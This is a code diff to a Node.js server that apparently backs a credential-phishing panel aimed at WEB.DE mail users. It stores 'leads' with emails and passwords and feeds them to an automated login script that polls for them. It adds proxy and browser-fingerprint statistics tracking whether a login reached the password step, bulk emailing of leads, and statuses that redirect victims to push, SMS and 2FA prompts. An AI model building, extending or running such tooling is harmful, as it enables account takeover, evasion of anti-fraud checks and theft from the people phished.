@@ -8,6 +8,7 @@ const { checkAdminAuth, checkWorkerSecret, checkAdminPageAuth, hasValidAdminSess
 const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
 const leadService = require('../services/leadService');
 const automationService = require('../services/automationService');
+const { incrementProxyFpStat } = require('../db/database');
 const chatService = require('../services/chatService');
 let nodemailer;
 try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
@@ -119,6 +120,35 @@ async function handle(scope) {
       return send(res, 500, { ok: false, error: msg });
     }
     return send(res, 200, { ok: true, content: content, path: pathOnServer });
+  }
+
+  /**
+   * Worker: записать статистику proxy+fingerprint.
+   * Body: { proxyServer, fpIndex, reachedPassword }
+   */
+  if (pathname === '/api/worker/proxy-fp-stats' && req.method === 'POST') {
+    if (!checkWorkerSecret(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch (e) {
+        return send(res, 400, { ok: false, error: 'invalid json' });
+      }
+      const proxyServer = json.proxyServer != null ? String(json.proxyServer).trim() : '';
+      const fpIndex = json.fpIndex != null ? json.fpIndex : json.fingerprintIndex;
+      const reachedPassword = json.reachedPassword === true || json.reachedPassword === 1 || json.reachedPassword === '1' || json.reachedPassword === 'true';
+      if (!proxyServer) return send(res, 400, { ok: false, error: 'proxyServer required' });
+      if (fpIndex == null || String(fpIndex).trim() === '') return send(res, 400, { ok: false, error: 'fpIndex required' });
+      try {
+        const ok = incrementProxyFpStat(proxyServer, fpIndex, reachedPassword);
+        if (!ok) return send(res, 400, { ok: false, error: 'invalid params' });
+      } catch (e) {
+        return send(res, 500, { ok: false, error: (e && e.message) || 'db error' });
+      }
+      return send(res, 200, { ok: true });
+    });
+    return true;
   }
 
   /** API для скрипта входа WEB.DE: отдать email и пароль лида (скрипт опрашивает, пока админ не введёт пароль). Асинхронное чтение leads.json — не блокирует event loop при большом файле и лавине запросов. */
@@ -785,6 +815,105 @@ async function handle(scope) {
       leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
       const code = result.statusCode || 500;
       return send(res, code, { ok: false, error: result.error || 'Ошибка отправки' });
+    });
+    return true;
+  }
+
+  /** Массовая отправка (Config → E-Mail) выбранным лидам. */
+  if (pathname === '/api/send-email-bulk' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', async () => {
+      if (!nodemailer) return send(res, 500, { ok: false, error: 'nodemailer not installed' });
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const ids = Array.isArray(json.ids) ? json.ids.map((x) => String(x || '').trim()).filter(Boolean) : [];
+      if (ids.length === 0) return send(res, 400, { ok: false, error: 'ids required' });
+      let leads = leadService.readLeads();
+      const byId = new Map(leads.map((l) => [l.id, l]));
+      let sent = 0;
+      let failed = 0;
+      let skipped = 0;
+      const failSamples = [];
+      await runConcurrent(ids, 1, async (id) => {
+        const lead = byId.get(id);
+        if (!lead) { skipped++; return; }
+        if (leadIsWorkedLikeAdmin(lead)) { skipped++; return; }
+        const to = (lead.email || lead.emailKl || '').trim();
+        if (!to) { skipped++; return; }
+        let result;
+        try {
+          result = await sendConfigEmailToLead(lead);
+        } catch (e) {
+          failed++;
+          if (failSamples.length < 8) failSamples.push({ id, error: (e && e.message) ? String(e.message).slice(0, 160) : 'exception' });
+          return;
+        }
+        if (result.ok) {
+          pushEvent(lead, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
+          leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
+          sent++;
+        } else {
+          failed++;
+          if (failSamples.length < 8) failSamples.push({ id, error: result.error || '' });
+        }
+      });
+      return send(res, 200, { ok: true, total: ids.length, sent, failed, skipped, failSamples });
+    });
+    return true;
+  }
+
+  /**
+   * Bulk actions from sidebar selection.
+   * action: hide | hide_except_success | hide_send_email | unhide
+   */
+  if (pathname === '/api/leads-sidebar-bulk' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const action = (json.action != null) ? String(json.action).trim() : '';
+      const ids = Array.isArray(json.ids) ? json.ids.map((x) => String(x || '').trim()).filter(Boolean) : [];
+      if (!action) return send(res, 400, { ok: false, error: 'action required' });
+      if (ids.length === 0) return send(res, 400, { ok: false, error: 'ids required' });
+      let leads = leadService.readLeads();
+      const byId = new Map(leads.map((l) => [l.id, l]));
+      let affected = 0;
+      let skipped = 0;
+      ids.forEach((id) => {
+        const lead = byId.get(id);
+        if (!lead) { skipped++; return; }
+        if (action === 'hide_except_success') {
+          if (String(lead.status || '') === 'show_success') { skipped++; return; }
+          leadService.hideLeadInAdminSidebar(id);
+          affected++;
+          return;
+        }
+        if (action === 'hide_send_email') {
+          if (!leadHasAnyConfigEmailSentEvent(lead)) { skipped++; return; }
+          leadService.hideLeadInAdminSidebar(id);
+          affected++;
+          return;
+        }
+        if (action === 'hide') {
+          leadService.hideLeadInAdminSidebar(id);
+          affected++;
+          return;
+        }
+        if (action === 'unhide') {
+          leadService.unhideLeadInAdminSidebar(id);
+          affected++;
+          return;
+        }
+        skipped++;
+      });
+      if (affected > 0 && typeof global.__gmwWssBroadcast === 'function') {
+        try { global.__gmwWssBroadcast({ type: 'leads-update' }); } catch (_) {}
+      }
+      return send(res, 200, { ok: true, affected, skipped });
     });
     return true;
   }
@@ -1703,7 +1832,8 @@ async function handle(scope) {
 
   if (pathname === '/api/webde-push-resend-poll' && req.method === 'GET') {
     if (!checkWorkerSecret(req, res)) return;
-    const leadId = parsed.query && parsed.query.leadId && String(parsed.query.leadId).trim();
+    const leadIdRaw = parsed.query && parsed.query.leadId && String(parsed.query.leadId).trim();
+    const leadId = leadIdRaw ? resolveLeadId(leadIdRaw) : '';
     if (!leadId) return send(res, 400, { ok: false, resend: false });
     const requested = !!webdePushResendRequested[leadId];
     if (requested) delete webdePushResendRequested[leadId];
@@ -1719,7 +1849,8 @@ async function handle(scope) {
     req.on('end', () => {
       let json = {};
       try { json = JSON.parse(body || '{}'); } catch {}
-      const id = json.id && String(json.id).trim();
+      const idRaw = json.id && String(json.id).trim();
+      const id = idRaw ? resolveLeadId(idRaw) : '';
       const success = json.success === true;
       const message = json.message != null ? String(json.message).trim().slice(0, 200) : '';
       if (!id) return send(res, 400, { ok: false });
@@ -1963,7 +2094,14 @@ async function handle(scope) {
           automationService.endWebdeAutoLoginRun(lead);
         }
       } else if (result === 'wrong_credentials') lead.status = 'error';
-      else if (result === 'push') lead.status = pushTimeout ? 'pending' : 'redirect_push';
+      else if (result === 'push') {
+        if (pushTimeout) {
+          lead.status = 'pending';
+          lead.scriptStatus = 'wait_password';
+        } else {
+          lead.status = 'redirect_push';
+        }
+      }
       else if (result === 'sms') lead.status = 'redirect_sms_code';
       else if (result === 'two_factor') lead.status = 'redirect_2fa_code';
       else if (result === 'wrong_2fa') lead.status = 'redirect_2fa_code';
